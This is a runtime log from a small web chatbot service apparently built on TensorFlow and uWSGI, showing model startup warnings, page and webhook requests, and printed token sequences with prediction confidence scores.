2020-11-01 08:19:35.584423: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-11-01 08:19:35.609924: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199920000 Hz
2020-11-01 08:19:35.610298: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x559437d0a5d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-11-01 08:19:35.610317: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-11-01 08:19:35.898385: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 08:19:35.899797: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 08:19:35.901157: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 16709|app: 0|req: 1/1] 121.171.33.70 () {52 vars in 931 bytes} [Sun Nov  1 08:19:26 2020] GET / => generated 1263 bytes in 9455 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 2/2] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 08:27:51 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 3/3] 121.171.33.70 () {50 vars in 881 bytes} [Sun Nov  1 08:27:55 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 4/4] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 08:27:56 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '']
['', '']
[[297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0 297   8]]
2020-11-01 08:28:11.805013: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-11-01 08:28:12.109409: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-11-01 08:28:12.110920: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-11-01 08:28:12.112336: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
89.55%   .

[pid: 16709|app: 0|req: 5/5] 66.249.84.11 () {42 vars in 542 bytes} [Sun Nov  1 08:28:07 2020] POST /webhook/ => generated 79 bytes in 5163 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '']
['', '']
[[297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0 297   8]]
89.55%   .

[pid: 16709|app: 0|req: 6/6] 66.249.84.13 () {42 vars in 542 bytes} [Sun Nov  1 08:28:14 2020] POST /webhook/ => generated 79 bytes in 64 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[9, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   9 297   8]]
91.02%   .

[pid: 16709|app: 0|req: 7/7] 66.249.84.11 () {42 vars in 542 bytes} [Sun Nov  1 08:28:29 2020] POST /webhook/ => generated 79 bytes in 61 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '', '', '']
['', '', '', '', '']
[[9, 9, 9, 297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   9   9   9 297   8]]
89.60%   .

[pid: 16709|app: 0|req: 8/8] 66.249.84.9 () {42 vars in 541 bytes} [Sun Nov  1 08:28:32 2020] POST /webhook/ => generated 79 bytes in 70 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '']
['', '', '']
[[1909, 545, 211]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0 1909
   545  211]]
71.53%   .

[pid: 16709|app: 0|req: 9/9] 66.249.84.13 () {42 vars in 540 bytes} [Sun Nov  1 08:28:36 2020] POST /webhook/ => generated 79 bytes in 48 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16709|app: 0|req: 10/10] 66.249.84.9 () {42 vars in 539 bytes} [Sun Nov  1 08:28:47 2020] POST /webhook/ => generated 157 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16709|app: 0|req: 11/11] 66.249.84.9 () {42 vars in 539 bytes} [Sun Nov  1 08:28:54 2020] POST /webhook/ => generated 165 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16709|app: 0|req: 12/12] 66.249.84.11 () {42 vars in 540 bytes} [Sun Nov  1 08:29:07 2020] POST /webhook/ => generated 165 bytes in 47 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['', '', '', '', '']
['', '', '', '']
[[387, 2211, 133, 8]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0  387 2211
   133    8]]
62.60%   .

[pid: 16709|app: 0|req: 13/13] 66.249.84.13 () {42 vars in 542 bytes} [Sun Nov  1 08:29:22 2020] POST /webhook/ => generated 79 bytes in 49 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '']
['', '', '']
[[9, 9, 8]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 9 9 8]]
96.15%   .

[pid: 16709|app: 0|req: 14/14] 66.249.84.9 () {42 vars in 541 bytes} [Sun Nov  1 08:29:24 2020] POST /webhook/ => generated 79 bytes in 49 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16709|app: 0|req: 15/15] 66.249.84.13 () {42 vars in 540 bytes} [Sun Nov  1 08:29:32 2020] POST /webhook/ => generated 157 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 16/16] 121.53.242.9 () {40 vars in 535 bytes} [Sun Nov  1 08:30:43 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 17/17] 117.111.2.218 () {40 vars in 643 bytes} [Sun Nov  1 08:30:47 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 18/18] 117.111.2.218 () {42 vars in 689 bytes} [Sun Nov  1 08:30:50 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 19/19] 117.111.2.218 () {42 vars in 691 bytes} [Sun Nov  1 08:30:50 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 20/20] 117.111.2.218 () {40 vars in 643 bytes} [Sun Nov  1 08:30:58 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 21/21] 117.111.2.218 () {42 vars in 691 bytes} [Sun Nov  1 08:31:00 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 22/22] 121.171.33.5 () {40 vars in 642 bytes} [Sun Nov  1 08:31:05 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 23/23] 117.111.2.218 () {40 vars in 643 bytes} [Sun Nov  1 08:31:05 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 24/24] 117.111.2.218 () {42 vars in 691 bytes} [Sun Nov  1 08:31:07 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 25/25] 121.171.33.5 () {42 vars in 688 bytes} [Sun Nov  1 08:31:09 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 26/26] 121.171.33.5 () {42 vars in 690 bytes} [Sun Nov  1 08:31:09 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 27/27] 121.171.33.70 () {50 vars in 881 bytes} [Sun Nov  1 08:31:13 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 28/28] 117.111.2.218 () {40 vars in 643 bytes} [Sun Nov  1 08:31:14 2020] GET / => generated 1263 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 29/29] 117.111.2.218 () {42 vars in 691 bytes} [Sun Nov  1 08:31:15 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
['', '', '']
['', '']
[[297, 8]]
[[  0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
    0   0   0   0   0   0   0   0   0   0 297   8]]
89.55%   .

[pid: 16709|app: 0|req: 30/30] 64.233.172.41 () {42 vars in 541 bytes} [Sun Nov  1 08:32:59 2020] POST /webhook/ => generated 79 bytes in 44 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '', '']
['', '', '']
[[441, 1556, 75]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0  441
  1556   75]]
94.54%   .

[pid: 16709|app: 0|req: 31/31] 64.233.172.45 () {42 vars in 543 bytes} [Sun Nov  1 08:33:29 2020] POST /webhook/ => generated 79 bytes in 46 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '', '']
['', '']
[[441, 5442]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
   441 5442]]
80.62%   .

[pid: 16709|app: 0|req: 32/32] 64.233.172.45 () {42 vars in 543 bytes} [Sun Nov  1 08:33:43 2020] POST /webhook/ => generated 79 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[5442]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 5442]]
65.63%   .

[pid: 16709|app: 0|req: 33/33] 64.233.172.41 () {42 vars in 541 bytes} [Sun Nov  1 08:33:46 2020] POST /webhook/ => generated 79 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['']
['']
[[5442]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0 5442]]
65.63%   .

[pid: 16709|app: 0|req: 34/34] 64.233.172.43 () {42 vars in 541 bytes} [Sun Nov  1 08:33:52 2020] POST /webhook/ => generated 79 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
['', '']
['', '']
[[9977, 116]]
[[   0    0    0    0    0    0    0    0    0    0    0    0    0    0
     0    0    0    0    0    0    0    0    0    0    0    0    0    0
  9977  116]]
85.63%   .

[pid: 16709|app: 0|req: 35/35] 64.233.172.45 () {42 vars in 541 bytes} [Sun Nov  1 08:34:18 2020] POST /webhook/ => generated 157 bytes in 47 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 16709|app: 0|req: 36/36] 121.171.33.70 () {52 vars in 936 bytes} [Sun Nov  1 08:34:52 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
